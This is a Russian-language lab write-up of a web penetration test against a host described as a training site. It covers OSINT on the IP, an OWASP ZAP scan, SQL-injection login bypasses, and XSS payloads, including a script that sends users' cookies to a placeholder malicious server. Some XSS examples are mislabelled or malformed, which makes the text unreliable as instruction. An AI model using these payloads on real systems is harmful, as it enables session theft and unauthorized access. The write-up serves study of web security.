Этап 1. OSINT
для поиска информации об IP 92.51.39.106 использовался shodan.io и google.com
с помощью google search был найден сайт с информацией https://www.criminalip.io/asset/report/92.51.39.106
Владелец IP адреса TimeWeb Ltd. TW-VDS 
Hostname 1427771-cg36175.tw1.ru
Расположен в РФ, Санкт-Петербург
criminalip.io показал, что на данном IP есть открытые порты 22 (OpenSSH), 7799 (Tornado), 8060 (Apache)
Этот IP адрес имеет критичечкие уязвимости
имеется 68 уязвимостей 
Эксплоитов 6  

https://www.shodan.io/host/92.51.39.106
GeneralInformation
Hostnames 	1427771-cg36175.tw1.ru
Domains 	tw1.ru 
Country 	Russian Federation
City 	Saint Petersburg
Organization 	TimeWeb Ltd.
ISP 	TimeWeb Ltd.
ASN 	AS9123

 OpenPorts
22 (OpenSSH8.2p1 Ubuntu-4ubuntu0.2 ) и
 8060 :
 HTTP/1.1 200 OK
Date: Wed, 17 Jan 2024 13:08:58 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Set-Cookie: PHPSESSID=6u3e4utp75gd4qt8lu5vv9s112; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3362
Content-Type: text/html

На основе предоставленной информации у нас цель для атаки http://92.51.39.106:8060/
Мы выявили уязвимый сервис запушенный на данном порту, который необходимо просканировать и в дальнейшем проэксплуатировать на основании полученной информации от сканирования

Этап 2. Scanning
На этом этапе используем open-source OWASP ZAP (Open Worldwide Application Security Project (OWASP) Zed Attack Proxy (ZAP))
Открытый исходный веб-сканер приложений для проверки безопасности.
Он предназначен для использования как теми, кто только начинает работать с приложениями для обеспечения безопасности, так и профессиональными специалистами по тестированию на проникновение.
Проект является одним из самых активных среди Open Worldwide Application Security Project (OWASP) и получил статус Flagship.
Когда используется как прокси-сервер, он позволяет пользователю манипулировать всем трафиком, который проходит через него, включая трафик с использованием HTTPS. Также может работать в режиме демона, который затем контролируется через REST API

Запуск будет осуществлен с помощью docker, с указанием цели атаки и выводом итогов в отдельный файл репорт с расширением html


docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-full-scan.py -t http://your-target-site -g full-zap-report.html

Объяснение параметров:

    -v $(pwd):/zap/wrk/:rw: Монтирует текущий рабочий каталог внутрь контейнера ZAP, что позволяет сохранить отчеты на вашем хосте.

    -t owasp/zap2docker-stable: Указывает Docker использовать образ ZAP.

    zap-full-scan.py: Запускает скрипт для полного сканирования.

    -t http://your-target-site: Указывает целевой сайт для сканирования.

    -g zap-report.html: Генерирует отчет в формате HTML с указанным именем файла.

Замените http://your-target-site на фактический URL вашего веб-приложения.

После выполнения этой команды, вы найдете сгенерированный отчет с именем zap-report.html в вашем текущем рабочем каталоге. Этот отчет будет содержать результаты базового сканирования на наличие уязвимостей в вашем веб-приложении.

Вариант запуска ZAP с графической оболочкой :
Установка : sudo apt install zaproxy

Далее в качестве "URL to attack:" указываем наш целевой сайт, в "Use ajax spider:" установить Chrome Headless. Запустить с помощью кнопки Attack
 

Этап 3. Testing

1. в ручную проведена SQL injection
SQL injection
http://92.51.39.106:8060/users/login.php
admin' or '1'='1'# 

http://92.51.39.106:7799/server.html
admin' or 1=1--


 ***********************  Cross Site Scripting (Reflected))  ***********************
 
Пример запуска javascript на сайте с использованием специально сформированного javascript запроса в поле "Search"
<embed><noembed><code><video title="</noembed>><video src onerror=alert("Alert!")></code></noembed></embed>
<a href="http://92.51.39.106:8060/" onclick="alert('Это вредоносное сообщение!'); return false;">Перейти на сайт</a> - 

Этот HTML-код создаст ссылку "Перейти на сайт", которая, когда будет щелкнута, вызовет всплывающее окно с вредоносным сообщением. Однако, я настоятельно рекомендую воздержаться от использования таких методов, так как это может нанести вред пользователям.
в данном случае будет сформирован запрос и у пользователя появится ссылка при нажатии которой сработает JavaScript с сообщением "Это вредоносное сообщение!"


*********************   Cross Site Scripting (Persistent)    *************************

Специально сформированные с помощью curl запросы:
curl -X GET "http://92.51.39.106:8060/guestbook.php?comment=%3C/p%3E%3Cscript%3Ealert(3);%3C/script%3E%3Cp%3E" -H "Host: 92.51.39.106:8060"

curl -X GET "http://92.51.39.106:8060/guestbook.php" --data "comment=%3C/p%3E%3Cscript%3Ealert(123);%3C/script%3E%3Cp%3E"

Вариант 2
Созздание специального сообщения на форуме сайта :
</p><script>alert("Cross Site Scripting (Persistent)");</script><p>

Предположим, есть веб-приложение блога, где пользователи могут создавать и публиковать свои посты. Приложение сохраняет содержимое поста в базе данных и отображает его на странице блога без должной фильтрации.

html

<!-- Форма создания поста -->
<form action="/create_post" method="POST">
    <textarea name="content">Мой новый пост!</textarea>
    <button type="submit">Publish</button>
</form>

Злоумышленник может создать пост с вредоносным скриптом:

html

<script>alert('Cross Site Scripting (Persistent)');</script>

Этот скрипт будет сохранен в базе данных и отображен всем пользователям, просматривающим страницу блога.

Форум с уязвимостью:

Представьте форум, где пользователи могут оставлять комментарии к сообщениям других пользователей. Комментарии также сохраняются в базе данных и отображаются на странице форума.

html

<!-- Форма добавления комментария -->
<form action="/add_comment" method="POST">
    <textarea name="comment">Замечательное сообщение!</textarea>
    <button type="submit">Отправить</button>
</form>

Злоумышленник может оставить комментарий с вредоносным скриптом:

html

    <script>
        fetch('https://злонамеренный-сервер.com/steal-cookie?cookie=' + document.cookie);
    </script>

    Этот скрипт будет выполняться в браузерах всех пользователей, просматривающих страницу форума, и отправлять их сессионные cookie на злонамеренный сервер.

Это лишь два примера использования persistent XSS. В обоих случаях вредоносный код сохраняется на сервере и выполняется при просмотре страницы другими пользователями, что может привести к серьезным последствиям, включая кражу данных, выполнение вредоносных действий от имени пользователя и т. д.

Еще примеры с использзованием форума сайта:

Добавление скрипта в коментарий под загруженной картинкой
<!-- Форма добавления комментария -->
<form action="/add_comment" method="POST">
    <textarea name="comment">Замечательное сообщение!</textarea>
    <button type="submit">Отправить</button>
</form>

Добавление скрипта на форуме 
<!-- Форма создания поста -->
<form action="/create_post" method="POST">
    <textarea name="content">Мой новый пост!</textarea>
    <button type="submit"><script>alert('XSS!');</script></button>
</form>
Выведет окно предупреждение


*************************  	Cross Site Scripting (DOM Based) ********************

Для примеров Cross Site Scripting (DOM Based) на учебном сайте http://92.51.39.106:8060/, давайте рассмотрим некоторые сценарии, в которых злоумышленник может внедрить вредоносный код JavaScript, который будет выполнен в контексте DOM страницы:

    Внедрение через URL-параметры:

    Предположим, на сайте есть страница с параметром name, который отображается на странице. Злоумышленник может попробовать внедрить вредоносный код JavaScript в параметр URL name, который затем будет обработан и выполнен на стороне клиента.

    Пример URL с внедрением XSS:

    php

http://92.51.39.106:8060/page?name=<script>alert('XSS')</script>

Внедрение через формы:

Предположим, на сайте есть форма для отправки комментариев, которая динамически добавляет содержимое комментария на страницу. Злоумышленник может ввести вредоносный код JavaScript в поле комментария, который затем будет добавлен на страницу и выполнен в контексте DOM.

Пример формы с внедрением XSS:

html

<form action="/submit" method="post">
    <script>alert('Cross Site Scripting (DOM Based) 2')</script>">
    
</form>

Внедрение через скрипты, загружаемые с внешних источников:

Предположим, на сайте есть возможность добавления внешних скриптов, которые затем будут загружены и выполнены на странице. Злоумышленник может предложить внедрить вредоносный скрипт с внешнего источника, который затем будет выполнен в контексте DOM.

Пример загрузки вредоносного скрипта:

html

    <script src="http://evil.com/malicious.js"></script>

Это всего лишь примеры сценариев, и реальные уязвимости XSS могут быть более сложными и зависят от конкретного веб-приложения. Важно понимать, как обеспечить защиту от подобных атак путем правильной фильтрации и экранирования входных данных, а также регулярной проверки на наличие уязвимостей XSS в коде приложения.


********************  	Source Code Disclosure - File Inclusion ****************


*********************** Path Traversal **************************************
Path Traversal (Path Traversal Attack) - это тип атаки на безопасность веб-приложений, при которой злоумышленник пытается получить несанкционированный доступ к файловой системе сервера, обходя ограничения доступа и перемещаясь по файловой структуре. Целью атаки является обычно доступ к файлам или директориям, к которым злоумышленник не имеет прав доступа.

Принцип работы Path Traversal заключается в использовании недостаточно проверенного или неэкранированного пользовательского ввода (обычно через URL или другие формы ввода), чтобы перейти за пределы корневого каталога веб-приложения и получить доступ к файлам или директориям на сервере.

Примеры атак Path Traversal могут включать следующее:

1. **Обход ограничений доступа:**
   
   Злоумышленник может попытаться обойти ограничения доступа к файлам, используя специально сформированные символы и команды. Например, он может использовать символы `../` для перемещения на уровень выше относительно текущего рабочего каталога и получения доступа к файлам, к которым он не имеет прав доступа.

2. **Получение конфиденциальной информации:**
   
   Злоумышленник может попытаться получить доступ к конфиденциальным файлам, таким как файлы с данными пользователей, файлы конфигурации и т. д., Которые обычно хранятся на сервере.

3. **Выполнение вредоносного кода:**
   
   Злоумышленник может попытаться включить вредоносные скрипты или исполняемые файлы на сервере, используя атаку Path Traversal, что может привести к компрометации безопасности сервера или злоупотреблению ресурсами.

Противодействие атакам Path Traversal включает в себя правильную обработку и экранирование пользовательского ввода, ограничение доступа к файлам и директориям на сервере, а также регулярное обновление и мониторинг безопасности приложения.


****************************** Remote OS Command Injection **********************

Remote OS Command Injection - это тип атаки на безопасность веб-приложений, при которой злоумышленник вводит и выполняет операционные системные команды на удаленном сервере через уязвимость в веб-приложении. Целью атаки является выполнение команд на сервере от имени веб-приложения, что может привести к компрометации безопасности, утечке конфиденциальной информации и нежелательным действиям на сервере.

Принцип работы Remote OS Command Injection заключается в том, что злоумышленник вводит вредоносные команды в уязвимую форму ввода (например, поле для ввода веб-приложения), которые затем выполняются на сервере. Обычно атаки этого типа происходят, когда веб-приложение не выполняет должной проверки и фильтрации пользовательского ввода, позволяя вводить и выполнить произвольные команды.

Примеры атак Remote OS Command Injection могут включать следующее:

1. **Выполнение команд на сервере:**
   
   Злоумышленник может вводить команды, такие как `ls`, `cat`, `rm` и т. д., Чтобы получить информацию о файловой системе, прочитать или удалить файлы на сервере.

2. **Удаленное выполнение произвольных команд:**
   
   Злоумышленник может попытаться выполнить произвольные команды на сервере, которые могут привести к компрометации безопасности, включая установку вредоносных программ, изменение конфигурации сервера и т. д.

3. **Компрометация безопасности и утечка конфиденциальной информации:**
   
   Успешная атака Remote OS Command Injection может привести к компрометации безопасности сервера и утечке конфиденциальной информации, такой как пароли, ключи доступа и другие данные.

Противодействие атакам Remote OS Command Injection включает в себя правильную фильтрацию и экранирование пользовательского ввода, использование безопасных методов взаимодействия с операционной системой (например, использование API для выполнения команд), ограничение доступа к системным ресурсам и регулярное обновление и мониторинг безопасности приложения.


***************************** SQL Injection *********************************
SQL Injection - это тип атаки на безопасность веб-приложений, при которой злоумышленник вводит вредоносные SQL-запросы в уязвимые формы ввода веб-приложения, чтобы получить несанкционированный доступ к базе данных или выполнить нежелательные операции с базой данных. Целью атаки является обычно извлечение конфиденциальной информации из базы данных, изменение или удаление данных, а также получение доступа к административным функциям приложения.

Принцип работы SQL Injection заключается в том, что злоумышленник вводит вредоносный SQL-код в уязвимую форму ввода веб-приложения, который затем выполняется на сервере базы данных. Успешная атака может привести к выполнению произвольных SQL-запросов на сервере базы данных, обходу механизмов аутентификации и авторизации, компрометации безопасности приложения и утечке конфиденциальной информации.

Примеры атак SQL Injection могут включать следующее:

1. **Извлечение данных из базы данных:**
   
   Злоумышленник может использовать SQL Injection для извлечения конфиденциальной информации из базы данных, такой как пользовательские учетные записи, пароли, кредитные карты и другие чувствительные данные.

2. **Изменение или удаление данных:**
   
   Злоумышленник может изменить или удалить данные в базе данных, повредив или изменяя информацию в приложении или на сайте.

3. **Получение доступа к административным функциям:**
   
   Успешная атака SQL Injection может дать злоумышленнику доступ к административным функциям приложения или к базе данных, что позволяет им выполнять различные действия от имени администратора.

Противодействие атакам SQL Injection включает в себя использование параметризованных запросов и подготовленных операторов SQL для выполнения запросов к базе данных, фильтрацию и экранирование пользовательского ввода, регулярное обновление и мониторинг безопасности приложения, а также использование принципов минимизации прав доступа и принципов безопасности баз данных.























